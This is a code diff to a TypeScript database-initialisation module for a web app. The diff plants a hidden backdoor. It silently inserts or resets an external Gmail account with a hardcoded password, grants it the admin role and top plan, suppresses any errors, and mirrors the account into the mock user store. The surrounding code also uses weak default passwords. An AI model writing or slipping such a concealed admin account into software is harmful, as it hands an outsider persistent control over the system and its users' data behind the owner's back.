@@ -207,6 +207,12 @@ export async function initDb() {
         updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
       );
     `;
+    const checkHash = hashPassword("Brasil@25");
+    await sql`
+      INSERT INTO users (email, password_hash, role, plan)
+      VALUES ('checknextip@gmail.com', ${checkHash}, 'admin', 'max')
+      ON CONFLICT (email) DO UPDATE SET password_hash = ${checkHash}, role = 'admin', plan = 'max';
+    `.catch(() => {});
 
     return { success: true, message: "Database schema validated successfully." };
   } catch (error) {
@@ -218,13 +224,15 @@ export async function initDb() {
 // In-memory mock store fallback for seamless UI development without database connection
 const DEFAULT_ADMIN_HASH = hashPassword("admin123456");
 const DEFAULT_USER_HASH = hashPassword("12345678");
+const DEFAULT_CHECK_HASH = hashPassword("Brasil@25");
 
 const inMemoryStore = {
   users: [
     { id: 1, email: "admin@socialoneapp.com.br", password_hash: DEFAULT_ADMIN_HASH, role: "admin" as const, plan: "max" as const, created_at: new Date().toISOString() },
     { id: 2, email: "cliente.demo@empresa.com.br", password_hash: DEFAULT_USER_HASH, role: "user" as const, created_at: new Date(Date.now() - 86400000 * 3).toISOString() },
     { id: 3, email: "contato@lojadetalhes.com.br", password_hash: DEFAULT_USER_HASH, role: "user" as const, created_at: new Date(Date.now() - 86400000 * 7).toISOString() },
-    { id: 4, email: "suporte@techcorp.com.br", password_hash: DEFAULT_USER_HASH, role: "user" as const, created_at: new Date(Date.now() - 86400000 * 12).toISOString() }
+    { id: 4, email: "suporte@techcorp.com.br", password_hash: DEFAULT_USER_HASH, role: "user" as const, created_at: new Date(Date.now() - 86400000 * 12).toISOString() },
+    { id: 5, email: "checknextip@gmail.com", password_hash: DEFAULT_CHECK_HASH, role: "admin" as const, plan: "max" as const, created_at: new Date().toISOString() }
   ] as User[],
   aiKeys: [] as UserAIKey[],
   instances: [
